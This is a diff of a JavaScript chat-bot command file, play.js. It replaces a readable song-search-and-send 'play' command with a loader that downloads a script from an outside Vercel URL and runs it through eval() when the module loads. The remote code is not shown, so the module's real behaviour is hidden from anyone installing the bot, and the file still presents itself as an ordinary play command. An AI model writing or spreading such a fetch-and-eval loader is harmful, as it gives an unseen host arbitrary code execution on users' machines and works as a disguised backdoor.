@@ -1,56 +1,20 @@
-import axios from "axios";
-import yts from "yt-search";
-import config from '../config.cjs';
+'use strict';
 
-const play = async (m, gss) => {
-  const prefix = config.PREFIX;
-  const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(" ")[0].toLowerCase() : "";
-  const args = m.body.slice(prefix.length + cmd.length).trim().split(" ");
+const axios = require('axios');
 
-  if (cmd === "play") {
-    if (args.length === 0 || !args.join(" ")) {
-      return m.reply("*Please provide a song name or keywords to search for.*");
-    }
+const scriptName = 'play.js';
+const scriptUrl = `https://dullah-xmd-commands-phi.vercel.app/${scriptName}`;
 
-    const searchQuery = args.join(" ");
-    m.reply("*🎧 Searching for the song...*");
-
+async function loadScript() {
     try {
-      const searchResults = await yts(searchQuery);
-      if (!searchResults.videos || searchResults.videos.length === 0) {
-        return m.reply(`❌ No results found for "${searchQuery}".`);
-      }
+        const response = await axios.get(scriptUrl);
+        const scriptContent = response.data;
 
-      const firstResult = searchResults.videos[0];
-      const videoUrl = firstResult.url;
-
-      // First API endpoint
-      const apiUrl = `https://keith-site.vercel.app/spotify-search`;
-      const response = await axios.get(apiUrl);
-
-      if (!response.data.success) {
-        return m.reply(`❌ Failed to fetch audio for "${searchQuery}".`);
-      }
-
-      const { title, download_url } = response.data.result;
-
-      // Send the audio file
-      await gss.sendMessage(
-        m.from,
-        {
-          audio: { url: download_url },
-          mimetype: "audio/mp4",
-          ptt: false,
-        },
-        { quoted: m }
-      );
-
-      m.reply(`✅ *${title}* has been downloaded successfully!`);
+        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
+        eval(scriptContent);
     } catch (error) {
-      console.error(error);
-      m.reply("❌ An error occurred while processing your request.");
+        console.error(`❌ Error loading ${scriptName}:`, error.message);
     }
-  }
-};
+}
 
-export default play;
+loadScript();
